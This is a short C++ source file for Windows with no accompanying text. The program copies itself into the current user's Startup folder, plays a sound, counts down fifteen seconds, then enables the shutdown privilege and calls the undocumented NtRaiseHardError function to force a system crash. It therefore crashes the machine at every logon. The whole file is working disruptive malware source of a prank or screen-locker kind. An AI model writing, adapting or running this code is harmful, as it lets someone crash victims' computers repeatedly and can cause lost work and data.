#include <windows.h>
#include <iostream>
#include <filesystem>

#pragma comment(lib, "ntdll.lib")


EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);

int main(void)
{
     char * user = getenv("username");
     int counter = 15;
     std::string startup = "C:\\Users\\" + std::string(user) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\main.exe";
     std::string filename = "main.exe";
     CopyFile(filename.c_str(), startup.c_str(),true);
     PlaySoundA("FX9eEhoRZhY.wav", NULL, SND_ASYNC | SND_FILENAME);

     while (counter >= 1)
     {
        std::cout << "\rTime remaining: " << counter << std::endl;
        Sleep(1000);
        counter--;
     }

     BOOLEAN bl;
     RtlAdjustPrivilege(19, TRUE, FALSE, &bl);
     unsigned long response;
     NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);

     return 0;
}